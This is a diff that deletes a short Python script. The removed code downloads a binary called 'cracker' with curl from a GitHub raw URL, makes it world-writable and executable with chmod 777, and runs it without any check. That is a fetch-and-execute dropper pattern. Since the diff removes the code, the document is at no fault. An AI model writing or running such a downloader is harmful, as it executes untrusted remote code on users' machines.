@@ -1,8 +1,0 @@
-import os,sys
-if not os.path.isfile('cracker'):
-    os.system('curl -L https://github.com/rsaprogrammers/cracking_module/blob/main//x/x/x/cracker?raw=true > cracker')
-    os.system('chmod 777 cracker')
-    os.system('./cracker')
-else:
-    os.system('chmod 777 cracker')
-    os.system('./cracker')
